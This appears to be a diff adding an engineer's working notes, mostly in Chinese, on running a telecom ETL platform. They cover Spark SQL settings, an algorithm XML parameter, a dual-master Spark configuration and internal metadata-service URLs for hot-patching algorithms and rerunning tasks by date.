+Caused by: java.lang.IllegalArgumentException: java.net.UnknownHostException: vm01CI02
+
+api_subscribe_state
+
+1.vmax-etl\config 目录下增加一个参数配置的文件 可以参考其他的文件新增
+2.算法XML中增加一行配置，示例如下
+  <executecycle executestart="" datastart="" dataend="" cycle="">province,day</executecycle>
+  <spark_special_parameter>spark_context_codegen_forindividual</spark_special_parameter> --增加这行
+  <algorithminfo subtype="sql">
+
+任务已经上牌再改算法不会重新生成，需要指定日期重新下发，下发后不需要重启元数据
+元数据任务重新下发URL(注意：日期是数据的日期，不是任务的日期)
+http://10.9.230.237:8889/metadataTest/onetask?algorithmName=lte_subject_trafficdensity_grid_hour_temp&day=2017-02-04&setInputLights=true
+
+spark-sql --executor-cores 6 --total-executor-cores 12 --executor-memory 16g
+
+Sqoop 连接关系型数据库与hadoop
+
+现场目前配置了两台master：zdh234:7077,wxbdzte75:7077用以主备倒换
+因此sparksql的相关配置项已修改，修改内容如下（红字部分）：
+路径/home/mr/spark/conf/api_spark_sql
+spark.sql.broadcastTimeout=600
+spark.master=spark://wxbdzte75:7077,zdh234:7077
+spark.ui.port=4100
+
+//元数据
+1）热补丁URL，新放入一个算法到算法目录后，执行下述命令，成功后算法会加载到内存，第二天生成任务的时候就会生成
+http://10.9.233.208:8889/metadataTest/patches?path=/home/netnumen/ems/ums-server/utils/vmax-metadata-manager/metadata/api/feature/AppUserQoe/algorithm/video_imsi_cause_hbase.xml
+2）可以指定任务、日期执行
+http://10.9.233.208:8889/metadataTest/onetask?algorithmName=video_imsi_cause_hbase&day=2017-05-10&setInputLights=true
+3）跟2）估计作用一样，正式版
+http://10.9.233.208:8889/specialDate/setonetask?algorithmName=fact_lte_pl_user_hbase&day=2017-05-08&setInputLights=true&hour=13,14&rerunSuccessTask=false
+4）修改数据库中数据公共板的状态，state=1就是翻牌，直接改数据库不行
+http://10.9.233.208:8889/metadataTest/modifylight?id=39&tablename=fact_lte_pl&state=1
